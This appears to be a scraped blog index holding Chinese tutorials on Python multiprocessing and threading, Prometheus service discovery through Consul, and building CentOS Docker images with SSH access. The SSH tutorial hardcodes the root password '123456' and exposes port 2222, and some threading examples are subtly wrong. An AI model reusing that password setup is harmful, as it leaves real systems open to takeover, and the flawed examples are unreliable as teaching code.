p2.start() p2.join() # 在子进程中修改全局变量对父进程中的全局变量没有影响 # 在创建子进程时对全局变量做了一个备份，父进程中的与子进程的num是完全不同的两个变量 print(&quot;父进程结束--%d&quot;%num) 5,启动大量的子进程123456789101112131415161718192021222324252627282930313233from multiprocessing import Poolimport os, time, randomdef run(name): print(&quot;子进程%s启动--%s&quot;%(name,os.getpid())) start =time.time() time.sleep(random.choice([1,2,3])) end = time.time() print(&quot;子进程%s结束--%s耗时%.2f&quot; % (name, os.getpid(),end-start))if __name__ ==&quot;__main__&quot;: print(&quot;父进程启动&quot;) #创建多个进程 #进程池 #表示可以同时执行的进程数量，看有多少线程 #Pool默认大小是CPU核心数4核8处理器，就是同时处理8个进程 pp =Pool() for i in range(10): #创建进程，放入进程池统一管理 pp.apply_async(run,args=(i,)) #自定义创建进程名字参数1 pp.apply_async(run,args=(&quot;11&quot;,)) pp.apply_async(run,args =(&quot;test&quot;,)) #在调用join之前必须先调用close,并且调用close之后就不能再继续添加新的进程了 pp.close() #进程池对象调用的join,会等待进程中的所有的子进程结束完毕再去执行父进程 pp.join() print(&quot;父进程结束&quot;) 6, 拷贝文件123456789101112131415161718192021222324252627282930313233343536373839404142import os,timefrom multiprocessing import Pool#实现文件的拷贝def copyFile(rPath,wPath): fr = open(rPath, &quot;rb&quot;) fw = open(wPath, &quot;wb&quot;) context = fr.read() fw.write(context) fr.close() fw.close()path= r&quot;D:\\py_work\\grep\\爬虫\\files&quot;toPath = r&quot;D:\\py_work\\grep\\爬虫\\tofile&quot;fileList = os.listdir(path)#单任务实现文件拷贝'''#启动for循环处理每一个文件start = time.time()for fileName in fileList: copyFile(os.path.join(path,fileName),os.path.join(toPath,fileName))end = time.time()print(&quot;总耗时： %0.2f&quot;%(end-start))'''#多进程实现文件拷贝if __name__== &quot;__main__&quot;: start = time.time() pp = Pool(8) for fileName in fileList: pp.apply_async(copyFile,args=(os.path.join(path,fileName),os.path.join(toPath,fileName))) pp.close() pp.join() end = time.time() print(&quot;总耗时： %0.2f&quot; % (end - start)) 7, 封装进程对象创建一个自定义文件yichenProcess.py 1234567891011121314from multiprocessing import Processimport os,timeclass YichenProcess(Process): def __init__(self,name): Process.__init__(self) self.name = name def run(self): print(&quot;子进程(%s-%s)启动&quot;%(self.name,os.getpid())) #子进程的功能 time.sleep(3) print(&quot;子进程(%s-%s)结束&quot; % (self.name, os.getpid())) 主程序执行 1234567891011from yichenProcess import YichenProcessif __name__ == &quot;__main__&quot;: print(&quot;父进程启动&quot;) #创建子进程 p =YichenProcess(&quot;test&quot;) #自动调用p进程对象的run方法 p.start() p.join() print(&quot;父进程结束&quot;) 8,进程间的通信-Queue12345678910111213141516171819202122232425262728293031323334353637from multiprocessing import Process,Queueimport os,timedef write(q): print(&quot;启动写子进程%s&quot;%(os.getpid())) for chr in [&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;]: q.put(chr) time.sleep(1) print(&quot;结束写子进程%s&quot; % (os.getpid()))def read(q): print(&quot;启动读子进程%s&quot;%(os.getpid())) while True: value = q.get(True) print(&quot;value= &quot;+ value) print(&quot;结束读子进程%s&quot; % (os.getpid()))if __name__ == &quot;__main__&quot;: #父进程创建队列，并传递给子进程 q = Queue() pw = Process(target=write, args=(q,)) pr = Process(target= read, args=(q,)) pw.start() pr.start() pw.join() #pr进程是个死循环，无法等待其结束，只能强行结束 pr.terminate() print(&quot;父进程结束&quot;) 3,线程1,线程1234567891011121314'''在一个进程的内部，要同时干多件事，就需要同时运行多个&quot;子任务&quot;，我们把进程内的这些&quot;子任务&quot;，叫做线程线程通常叫做轻型的进程。线程是共享内存空间的并发执行的多任务，每一个线程都共享一个进程的资源线程是最小的执行单元，而进程有至少一个线程组成。如何调度进程和线程，完全由操作系统决定，程序自己不能决定什么时候执行，执行多长时间。模块1、_thread模块 低级模块(接近底层)2、threading模块 高级模块，对_thread进行了封装''' 2,启动一个线程123456789101112131415161718192021222324import threading ,timea =10def run(num): print(&quot;子线程(%s)开始&quot;%(threading.current_thread().name)) time.sleep(2) #实现线程的功能 print(&quot;打印&quot; ,num) time.sleep(2) print(a) print(&quot;子线程(%s)结束&quot; % (threading.current_thread().name))if __name__ ==&quot;__main__&quot;: #任何进程默认就会启动一个线程，称为主线程，主线程可以启动新的子线程 #current_thread(): 返回当前线程的实例 print(&quot;主线程(%s)启动&quot;%(threading.current_thread().name)) #创建子线程 线程的名称 t = threading.Thread(target=run,name =&quot;runThread&quot;,args=(1,)) t.start() #等待线程结束 t.join() print(&quot;主线程(%s)结束&quot; % (threading.current_thread().name)) 3,线程间共享数据1234567891011121314151617181920212223242526272829303132333435363738import threading'''多线程和多进程最大的不同在于，多进程中，同一个变量各自有一份拷贝存在每个进程中，互不影响。而多线程中，所有变量都有所有线程共享。所以任何一个变量都可以被任意一个线程修改，因此，线程之间共享数据最大的危险在于多个线程同时修改一个变量，容易把内容改乱了。'''num = 0def run(n): global num for i in range(100000): num = num + n num = num - nif __name__ ==&quot;__main__&quot;: t1= threading.Thread(target=run,args=(6,)) t2 = threading.Thread(target=run,args =(9,)) t1.start() t2.start() t1.join() t2.join() print(&quot;num = &quot;, num)'''线程1 num + 6线程2 num = num + 9线程2 num -9线程1 num = 9''' 4,线程锁解决数据混乱12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import threading'''两个线程同时工作，一个存钱，一个取钱可能导致数据异常思路：加锁'''#锁对象lock = threading.Lock()num = 0def run(n): global num for i in range(1000000): ''' # 锁 # 确保了这段代码只能由一个线程从头到尾的完整执行 #阻止了多线程的并发执行，包含锁的某段代码实际上只能以单线程模式执行，所以效率大大的降低了。 #由于可以存在多个锁，不同线程持有不同的锁，并试图获取其他的锁，可能造成死锁，导致多个线程挂起。 只能靠操作系统强制终止 lock.acquire() try: num = num + n num = num - n finally: #修改完一定要释放锁 lock.release() ''' #与上面的代码功能相同， with lock可以自动上锁与解锁 with lock: num = num + n num = num - nif __name__ ==&quot;__main__&quot;: t1= threading.Thread(target=run,args=(6,)) t2 = threading.Thread(target=run,args =(9,)) t1.start() t2.start() t1.join() t2.join() print(&quot;num = &quot;, num) 5,ThreadLocal1234567891011121314151617181920212223242526272829303132import threadingnum = 0#创建一个全局的ThreadLocal对象#每个线程有独立的存储空间#每个线程对ThreadLocal对象都可以读写，但是互不影响。local = threading.local()list = [num,num]def run(x,n): x = x + n x = x - ndef func(n): #每个线程都有local.x,就是线程的局部变量 local.x = num for i in range(100000): run(local.x,n) print(&quot;%s-%d&quot;%(threading.current_thread().name,local.x ))if __name__ ==&quot;__main__&quot;: t1= threading.Thread(target=func,args=(6,)) t2 = threading.Thread(target=func,args =(9,)) t1.start() t2.start() t1.join() t2.join() print(&quot;num = &quot;, num)#作用：为每个线程绑定一个数据库连接，HTTP请求，用户身份信息等，这样一个线程的所有调用到的处理函数都可以非常方便的访问这些资源。 6,信号量控制线程数量123456789101112131415import threading,timesem = threading.Semaphore(3)def run(): while sem: for i in range(5): print(&quot;%s --= %d&quot;%(threading.current_thread().name,i)) time.sleep(1)if __name__ ==&quot;__main__&quot;: for i in range(5): threading.Thread(target=run).start() 7,凑够一定数量才能一起执行12345678910111213141516import threading,timebar = threading.Barrier(3)def run(): print(&quot;%s --start &quot;%(threading.current_thread().name)) time.sleep(1) bar.wait() print(&quot;%s --end &quot; % (threading.current_thread().name))if __name__ ==&quot;__main__&quot;: for i in range(5): threading.Thread(target=run).start() 8,定时线程123456789101112import threadingdef run(): print(&quot;yichen is a good man&quot;)#延时执行线程t= threading.Timer(5,run)t.start()t.join()print(&quot;父线程结束&quot;) 9,线程通信1234567891011121314151617181920212223242526import threading,timedef func(): #事件对象 event = threading.Event() def run(): for i in range(5): #阻塞，等待事件的触发 event.wait() #重置 event.clear() print(&quot;yichen is a good man!! %d&quot;%(i)) t = threading.Thread(target= run).start() return evente = func()#触发事件for i in range(5): time.sleep(2) e.set() 10,生产者与消费者123456789101112131415161718192021222324252627282930313233343536373839import threading,queue,time,random#生产者def product(id,q): while True: num = random.randint(0,10000) q.put(num) print(&quot;生产者%d生产了%d数据放入了队列&quot;%(id,num)) time.sleep(3) #任务完成 q.task_done()#消费者def customer(id,q): while True: item = q.get() if item is None: break print(&quot;消费者%d消费了%d数据&quot;%(id,item)) time.sleep(3) # 任务完成 q.task_done()if __name__ ==&quot;__main__&quot;: #消息队列 q = queue.Queue() #启动生产者 for i in range(4): threading.Thread(target=product,args=(i,q)).start() #启动消费者 for i in range(3): threading.Thread(target=customer,args=(i,q)).start() 11,线程调度123456789101112131415161718192021import threading,timecond = threading.Condition()def run1(): with cond: for i in range(0,10, 2): print(threading.current_thread().name, i) #time.sleep(1) cond.wait() cond.notify()def run2(): with cond: for i in range(1,10, 2): print(threading.current_thread().name, i) #time.sleep(1) cond.notify() cond.wait()threading.Thread(target=run1).start()threading.Thread(target=run2).start() 4,协程1,协程1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253'''子程序/函数: 在所有语言中都是层级调用，比如A调用B，在B执行的过程中又可以调用C，C执行完毕返回，B执行完毕返回，最后是A执行完毕,是通过栈实现的，一个线程就是执行一个子程序，子程序调用总是一个入口，一次返回，调用的顺序是明确的。概述：看上去也是子程序，但执行过程中，在子程序的内部可中断，然后转而去执行别的子程序，不是函数调用。''''''def C(): print(&quot;C--start&quot;) print(&quot;C--end&quot;)def B(): print(&quot;B--start&quot;) C() print(&quot;B--end&quot;)def A(): print(&quot;A--start&quot;) B() print(&quot;A--end&quot;)A()'''def A(): print(1) print(2) print(3)def B(): print(&quot;x&quot;) print(&quot;y&quot;) print(&quot;z&quot;)'''12xyz3执行出这个结果但是A中没有B的调用看起来A、B执行过程中有点像线程，但协程的特点在于是一个线程执行与线程相比，协程的执行效率极高，因为只有一个线程，也不存在同时写变量额冲突，在协程中共享资源部加锁，只需要判断状态''' 2,协程原理12345678910111213141516171819202122'''Python对协程的支持是通过generator实现的'''def run(): print(1) yield 10 print(2) yield 20 print(2) yield 30#协程的最简单风格，控制函数的阶段执行，节约线程或者进程的切换#返回值是一个生成器m = run()print(next(m))print(next(m))print(next(m)) 3,数据传输12345678910111213141516171819202122def run(): #空变量，存储的作用data始终为空 data = &quot;&quot; r = yield data print(1,r,data) r = yield data print(2,r, data) r = yield data print(3,r,data) r = yield datam = run()#启动mprint(m.send(None))print(m.send(&quot;a&quot;))print(m.send(&quot;b&quot;))print(m.send(&quot;c&quot;))print(&quot;********&quot;)","link":"/2020/08/04/%E5%A4%9A%E4%BB%BB%E5%8A%A1%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"},{"title":"Prometheus基于Consul服务发现","text":"一、环境 主机名 IP地址 系统 说明 localhost 192.168.224.11 Centos7.6 docker安装的prometheus server2.com 192.168.224.12 Centos7.6 二、基于 Consul 的服务发现Consul 是由 HashiCorp 开发的一个支持多数据中心的分布式服务发现和键值对存储服务的开源软件，是一个通用的服务发现和注册中心工具，被大量应用于基于微服务的软件架构当中。 我们通过api将exporter服务注册到 Consul，然后配置 Prometheus 从 Consul 中发现实例。关于 Consul 本身的使用可以查看官方文档https://learn.hashicorp.com/consul了解更多。 1、二进制安装配置 Consul（二选一）在页面https://www.consul.io/downloads下载符合自己系统的安装文件，比如我们这里是 Linux 系统，使用下面命令下载安装即可： 12345678wget https://releases.hashicorp.com/consul/1.14.5/consul_1.14.5_linux_amd64.zipyum install unzip -yunzip consul_1.14.5_linux_amd64.zipmv consul /usr/local/binconsul version 启动consul为了查看更多的日志信息，我们可以在 dev 模式下运行 Consul，如下所示： 1consul agent -dev -client 0.0.0.0 启动命令后面使用 -client 参数指定了客户端绑定的 IP 地址，默认为 127.0.0.1 2、docker安装Consul二选一）docker运行 1docker run -d --name consul -p 8500:8500 consul:1.14.5 检查 1docker ps 3、consul http访问地址1http://192.168.224.11:8500/ui/dc1/services 4、通过api注册到Consul使用命令行注册 1curl -X PUT -d '{&quot;id&quot;: &quot;node1&quot;,&quot;name&quot;: &quot;node_exporter&quot;,&quot;address&quot;: &quot;node_exporter&quot;,&quot;port&quot;: 9100,&quot;tags&quot;: [&quot;exporter&quot;],&quot;meta&quot;: {&quot;job&quot;: &quot;node_exporter&quot;,&quot;instance&quot;: &quot;Prometheus服务器&quot;},&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.11:9100/metrics&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/register 把json数据放在文件中，使用这个json文件注册 1234567891011121314151617181920mkdir /data/consulcd /data/consulcat &gt; node_exporter.json&lt;&lt;&quot;EOF&quot; { &quot;id&quot;: &quot;node2&quot;, &quot;name&quot;: &quot;node_exporter&quot;, &quot;address&quot;: &quot;192.168.224.12&quot;, &quot;port&quot;: 9100, &quot;tags&quot;: [&quot;exporter&quot;], &quot;meta&quot;: { &quot;job&quot;: &quot;node_exporter&quot;, &quot;instance&quot;: &quot;server2.com服务器&quot; }, &quot;checks&quot;: [{ &quot;http&quot;: &quot;http://192.168.224.12:9100/metrics&quot;, &quot;interval&quot;: &quot;10s&quot; }] } EOF 使用json文件注册 1curl --request PUT --data @node_exporter.json http://localhost:8500/v1/agent/service/register 除了我们注册的 2 个 demo 服务之外，Consul agent 还会将自己注册为一个名为 consul 的服务，我们可以在浏览器中访问 http://192.168.224.11:8500 查看注册的服务。 在 Consul UI 页面中可以看到有 consul 和 node_exporter 两个 Service 服务。 5、配置 Prometheus上面我们通过 Consul 注册了 2 个 node_exporter 服务，接下来我们将配置 Prometheus 通过 Consul 来自动发现 node_exporter服务。 在 Prometheus 的配置文件 prometheus.yml 文件中的 scrape_configs 部分添加如下所示的抓取配置： 备份源文件 123cd /data/docker-prometheuscp -a prometheus/prometheus.yml prometheus/prometheus.yml.bakls -l prometheus/prometheus.yml.bak 使用cat去掉之前的配置,使用下面的配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133cat &gt; prometheus/prometheus.yml&lt;&lt;&quot;EOF&quot; # 全局配置global: scrape_interval: 15s # 将搜刮间隔设置为每15秒一次。默认是每1分钟一次。 evaluation_interval: 15s # 每15秒评估一次规则。默认是每1分钟一次。# Alertmanager 配置alerting: alertmanagers: - static_configs: - targets: ['alertmanager:9093']# 报警(触发器)配置rule_files: - &quot;alert.yml&quot; - &quot;rules/*.yml&quot;# 搜刮配置scrape_configs: - job_name: 'prometheus' # 覆盖全局默认值，每15秒从该作业中刮取一次目标 scrape_interval: 15s static_configs: - targets: ['localhost:9090'] - job_name: 'alertmanager' # 覆盖全局默认值，每15秒从该作业中刮取一次目标 scrape_interval: 15s static_configs: - targets: ['alertmanager:9093'] - job_name: 'consul_exporter' consul_sd_configs: - server: '192.168.224.11:8500' services: [] relabel_configs: - source_labels: [__meta_consul_tags] regex: .*exporter.* action: keep - regex: __meta_consul_service_metadata_(.+) action: labelmap# Spring Boot 2.x 应用数据采集配置 - job_name: 'consul_springboot_demo' metrics_path: '/actuator/prometheus' scrape_interval: 5s consul_sd_configs: - server: '192.168.224.11:8500' services: [] relabel_configs: - source_labels: [__meta_consul_tags] regex: .*springboot.* action: keep - regex: __meta_consul_service_metadata_(.+) action: labelmap#http配置 - job_name: &quot;consul-blackbox_http&quot; metrics_path: /probe params: module: [http_2xx] consul_sd_configs: - server: '192.168.224.11:8500' services: [] relabel_configs: - source_labels: [__meta_consul_tags] regex: .*blackbox_http.* action: keep - regex: __meta_consul_service_metadata_(.+) action: labelmap - source_labels: [__meta_consul_service_address] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.224.12:9115#tcp检查配置 - job_name: &quot;consul_blackbox_tcp&quot; metrics_path: /probe params: module: [tcp_connect] consul_sd_configs: - server: '192.168.224.11:8500' services: [] relabel_configs: - source_labels: [__meta_consul_tags] regex: .*blackbox_tcp.* action: keep - regex: __meta_consul_service_metadata_(.+) action: labelmap - source_labels: [__meta_consul_service_address] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.224.12:9115#icmp检查配置 - job_name: &quot;consul_blackbox_icmp&quot; metrics_path: /probe params: module: [icmp] consul_sd_configs: - server: '192.168.224.11:8500' services: [] relabel_configs: - source_labels: [__meta_consul_tags] regex: .*blackbox_icmp.* action: keep - regex: __meta_consul_service_metadata_(.+) action: labelmap - source_labels: [__meta_consul_service_address] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.224.12:9115#域名检测 - job_name: consul_domain_exporter scrape_interval: 10s metrics_path: /probe consul_sd_configs: - server: '192.168.224.11:8500' services: [] relabel_configs: - source_labels: [__meta_consul_tags] regex: .*domain.* action: keep - regex: __meta_consul_service_metadata_(.+) action: labelmap - source_labels: [__meta_consul_service_address] target_label: __param_target - target_label: __address__ replacement: 192.168.224.12:9222EOF 通过 consul_sd_configs 配置用于自动发现的 Consul 服务地址，服务名为[]，我们通过relabel_configs的过滤规则只接收指定的exporter 1curl -X POST http://localhost:9090/-/reload 配置完成后重新启动 Prometheus，然后重新查看 Prometheus 页面上的 targets 页面，验证上面的配置是否存在： 1http://192.168.224.11:9090/targets 正常情况下是可以看到会有一个 exporter 的任务，下面有 2 个自动发现的抓取目标。 6、创建添加脚本使用预先准备好的脚本，一次添加多个targets: 12345678910111213141516171819202122232425262728293031323334353637383940cat &gt;/data/consul/api.sh &lt;&lt;&quot;EOF&quot;#nginxcurl -X PUT -d '{&quot;id&quot;: &quot;nginx1&quot;,&quot;name&quot;: &quot;nginx_exporter&quot;,&quot;address&quot;: &quot;192.168.224.12&quot;,&quot;port&quot;: 9113,&quot;tags&quot;: [&quot;exporter&quot;],&quot;meta&quot;: {&quot;job&quot;: &quot;nginx_exporter&quot;,&quot;instance&quot;: &quot;server2.com服务器&quot;,&quot;env&quot;:&quot;server2.com&quot;},&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.12:9113/metrics&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/register#rabbitmqcurl -X PUT -d '{&quot;id&quot;: &quot;rabbitmq1&quot;,&quot;name&quot;: &quot;rabbitmq_exporter&quot;,&quot;address&quot;: &quot;192.168.224.12&quot;,&quot;port&quot;: 9419,&quot;tags&quot;: [&quot;exporter&quot;],&quot;meta&quot;: {&quot;job&quot;: &quot;rabbitmq_exporter&quot;,&quot;instance&quot;: &quot;server2.com服务器&quot;,&quot;env&quot;:&quot;server2.com&quot;},&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.12:9419/metrics&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/register#rediscurl -X PUT -d '{&quot;id&quot;: &quot;redis1&quot;,&quot;name&quot;: &quot;redis_exporter&quot;,&quot;address&quot;: &quot;192.168.224.12&quot;,&quot;port&quot;: 9121,&quot;tags&quot;: [&quot;exporter&quot;],&quot;meta&quot;: {&quot;job&quot;: &quot;redis_exporter&quot;,&quot;instance&quot;: &quot;server2.com服务器&quot;,&quot;env&quot;:&quot;server2.com&quot;},&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.12:9121/metrics&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/register#mongodbcurl -X PUT -d '{&quot;id&quot;: &quot;mongodb1&quot;,&quot;name&quot;: &quot;mongodb_exporter&quot;,&quot;address&quot;: &quot;192.168.224.12&quot;,&quot;port&quot;: 9216,&quot;tags&quot;: [&quot;exporter&quot;],&quot;meta&quot;: {&quot;job&quot;: &quot;mongodb_exporter&quot;,&quot;instance&quot;: &quot;server2.com服务器&quot;,&quot;env&quot;:&quot;server2.com&quot;},&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.12:9216/metrics&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/register#mysqlcurl -X PUT -d '{&quot;id&quot;: &quot;mysql1&quot;,&quot;name&quot;: &quot;mysqld_exporter&quot;,&quot;address&quot;: &quot;192.168.224.12&quot;,&quot;port&quot;: 9104,&quot;tags&quot;: [&quot;exporter&quot;],&quot;meta&quot;: {&quot;job&quot;: &quot;mysqld_exporter&quot;,&quot;instance&quot;: &quot;server2.com服务器&quot;,&quot;env&quot;:&quot;server2.com&quot;},&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.12:9104/metrics&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/register#cadvisorcurl -X PUT -d '{&quot;id&quot;: &quot;cadvisor1&quot;,&quot;name&quot;: &quot;cadvisor&quot;,&quot;address&quot;: &quot;cadvisor&quot;,&quot;port&quot;: 8080,&quot;tags&quot;: [&quot;exporter&quot;],&quot;meta&quot;: {&quot;job&quot;: &quot;cadvisor&quot;,&quot;instance&quot;: &quot;Prometheus服务器&quot;,&quot;env&quot;:&quot;server2.com&quot;},&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.11:8080/metrics&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/registercurl -X PUT -d '{&quot;id&quot;: &quot;cadvisor2&quot;,&quot;name&quot;: &quot;cadvisor&quot;,&quot;address&quot;: &quot;192.168.224.12&quot;,&quot;port&quot;: 8080,&quot;tags&quot;: [&quot;exporter&quot;],&quot;meta&quot;: {&quot;job&quot;: &quot;cadvisor&quot;,&quot;instance&quot;: &quot;server2.com服务器&quot;,&quot;env&quot;:&quot;server2.com&quot;},&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.12:8080/metrics&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/register#springbootcurl -X PUT -d '{&quot;id&quot;: &quot;springboot1&quot;,&quot;name&quot;: &quot;springboot&quot;,&quot;address&quot;: &quot;192.168.224.12&quot;,&quot;port&quot;: 8081,&quot;tags&quot;: [&quot;springboot&quot;],&quot;meta&quot;: {&quot;job&quot;: &quot;springboot&quot;,&quot;instance&quot;: &quot;server2.com服务器&quot;,&quot;env&quot;:&quot;server2.com&quot;},&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.12:8081/actuator/prometheus&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/register#process_exportercurl -X PUT -d '{&quot;id&quot;: &quot;process1&quot;,&quot;name&quot;: &quot;process_exporter&quot;,&quot;address&quot;: &quot;192.168.224.12&quot;,&quot;port&quot;: 9256,&quot;tags&quot;: [&quot;exporter&quot;],&quot;meta&quot;: {&quot;job&quot;: &quot;process_exporter&quot;,&quot;instance&quot;: &quot;server2.com服务器&quot;,&quot;env&quot;:&quot;server2.com&quot;},&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.12:9256/metrics&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/register#httpcurl -X PUT -d '{&quot;id&quot;: &quot;http1&quot;,&quot;name&quot;: &quot;blackbox_http&quot;,&quot;address&quot;: &quot;https://www.jd.com&quot;,&quot;tags&quot;: [&quot;blackbox_http&quot;],&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.12:9115&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/register#tcpcurl -X PUT -d '{&quot;id&quot;: &quot;tcp1&quot;,&quot;name&quot;: &quot;blackbox_tcp&quot;,&quot;address&quot;: &quot;192.168.224.11:9090&quot;,&quot;tags&quot;: [&quot;blackbox_tcp&quot;],&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.12:9115&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/register#icmpcurl -X PUT -d '{&quot;id&quot;: &quot;icmp1&quot;,&quot;name&quot;: &quot;blackbox_icmp&quot;,&quot;address&quot;: &quot;192.168.224.12&quot;,&quot;tags&quot;: [&quot;blackbox_icmp&quot;],&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.12:9115&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/register#domincurl -X PUT -d '{&quot;id&quot;: &quot;domain1&quot;,&quot;name&quot;: &quot;domain_exporter&quot;,&quot;address&quot;: &quot;baidu.com&quot;,&quot;tags&quot;: [&quot;domain&quot;],&quot;checks&quot;: [{&quot;http&quot;: &quot;http://192.168.224.12:9222&quot;, &quot;interval&quot;: &quot;5s&quot;}]}' http://localhost:8500/v1/agent/service/registerEOF 执行脚本 1sh /data/consul/api.sh 检查 1http://192.168.224.11:9090/targets 7、consul删除服务1curl --request PUT http://127.0.0.1:8500/v1/agent/service/deregister/ID 8、问题consul健康检查失败如下图： 原因： 是因为并没有把8080映射出来（下图显示），导致consul监控检查不通过，所以报错。 解决修改docker-compose.yaml文件把8080端口映射出来，就好了，如下图： 修改完成后，执行命令 1docker-compose up -d 三、ConsulManager官方gitee地址 1、ConsulManager需要依赖Consul，请先完成Consul的部署。（暂时最高支持Consul v1.14.5）（docs/Consul部署说明.md） 2、使用docker-compose来部署ConsulManager 下载：wget https://starsl.cn/static/img/docker-compose.yml（仓库根目录下docker-compose.yml） 编辑： 1vim docker-compose.yml 修改3个环境变量： **consul_token**：consul的登录token（如何获取？）,当然也可以不获取token，这样consul使用无密码登录（不安全）。 **consul_url**：consul的URL(http开头，/v1要保留) **admin_passwd**：登录ConsulManager Web的admin密码 启动：docker-compose pull &amp;&amp; docker-compose up -d 访问：http://192.168.224.11:1026/，使用配置的变量 admin_passwd 登录 安装使用中遇到问题，请参考：FAQ","link":"/2023/05/09/%E5%9F%BA%E4%BA%8E_Consul_%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/"},{"title":"创建centos镜像支持ssh远程连接","text":"创建centos镜像支持ssh连接一，方法一先建一个目录和创建一个Dockerfile文件 12345678910111213141516171819202122232425262728mkdir /root/tuisong/centos7_systemdcd /root/tuisong/centos7_systemdvim DockerfileFROM centos:7# 使用阿里云仓库，启用systemd，启用service，加入中文支持。ENV container=&quot;docker&quot; LC_ALL=&quot;zh_CN.UTF-8&quot;RUN (cd /lib/systemd/system/sysinit.target.wants/; for i in *; do [ $i == \\ systemd-tmpfiles-setup.service ] || rm -f $i; done); \\ rm -f /lib/systemd/system/multi-user.target.wants/*; \\ rm -f /etc/systemd/system/*.wants/*; \\ rm -f /lib/systemd/system/local-fs.target.wants/*; \\ rm -f /lib/systemd/system/sockets.target.wants/*udev*; \\ rm -f /lib/systemd/system/sockets.target.wants/*initctl*; \\ rm -f /lib/systemd/system/basic.target.wants/*; \\ rm -f /lib/systemd/system/anaconda.target.wants/*; \\ ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime; \\ curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo; \\ curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo; \\ yum makecache; \\ yum -y install kde-l10n-Chinese gcc nc initscripts; \\ yum -y reinstall glibc-common; \\ localedef -c -f UTF-8 -i zh_CN zh_CN.UTF-8; \\ echo 'LANG=&quot;zh_CN.UTF-8&quot;' &gt; /etc/locale.conf; \\ yum clean all; \\ rm -rf /var/cache/yum/*;VOLUME [ &quot;/sys/fs/cgroup&quot; ]CMD [&quot;/usr/sbin/init&quot;] 获取镜像 创建一个tuisong.yaml文件 12345678910111213141516171819202122232425262728cd /root/tuisong/vim tuisong.yamlversion: &quot;3&quot;services: centos: build: ./centos7_systemd container_name: master hostname: Docker推送 tty: true privileged: true working_dir: /root ports: - &quot;2222:22&quot; - &quot;10060:10060&quot; restart: always volumes: - &quot;tuisong:/software&quot; - &quot;/sys/fs/cgroup:/sys/fs/cgroup&quot; networks: - masternetworks: master:volumes: tuisong: driver: local-persist driver_opts: mountpoint: /data/tuisong 首先安装docker-compose yum -y install python-pip pip install docker-compose docker-compose -f tuisong.yaml up -d –build 然后进入容器安装sshd docker exec -it master bash 123yum install lrzsz vim -yyum install openssh-server -ysystemctl enable sshd &amp;&amp; systemctl start sshd 然后设置密码 123[root@Docker ~]# passwd输入两次 123 回车就可以了，然后就可以通过2222端口进入容器了 二，方法二 这个copy 或者add是只复制目录下内容的 不复制目录本身 还有很多用法直接google查就好 1 代表Dockerfile目录下的文件或目录名 .代表workdir 也可以写想要复制到容器的哪个位置绝对路径Dockerfile文件内容为 123mkdir /Dockerfile cd /Dockerfileecho &quot;1123&quot; &gt; 1 vim Dockerfile 等于把1这个文件拷贝到容器的工作目录APP这个目录里， 以下是内容文件内容 1234567891011FROM centos:7WORKDIR /APPRUN yum -y install openssh-server vim lsof ansible \\ &amp;&amp; echo &quot;123456&quot; | passwd --stdin rootRUN rm -rf /etc/localtime &amp;&amp; ln -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime #修改时区RUN yum -y install kde-l10n-Chinese &amp;&amp; yum -y reinstall glibc-common #安装中文支持RUN localedef -c -f UTF-8 -i zh_CN zh_CN.utf8 #配置显示中文ENV LC_ALL zh_CN.utf8 #设置环境变量RUN yum -y install python-setuptools &amp;&amp; easy_install pip &amp;&amp; pip install supervisor #安装supervisor多进程管理工具，用于启动多进程COPY 1 .EXPOSE 22 在Dockerfile目录运行 获取镜像root密码为123456 centos:luke为镜像名 1docker build -t centos7:luke . 运行镜像 1docker run -itd --name centos-test --privileged --restart=always -p 2222:22 centos7:luke init 然后就可以直接连接2222端口进入容器了 解决docker容器中Centos7系统的中文乱码问题有如下两种方案： 第一种只能临时解决中文乱码： ​ 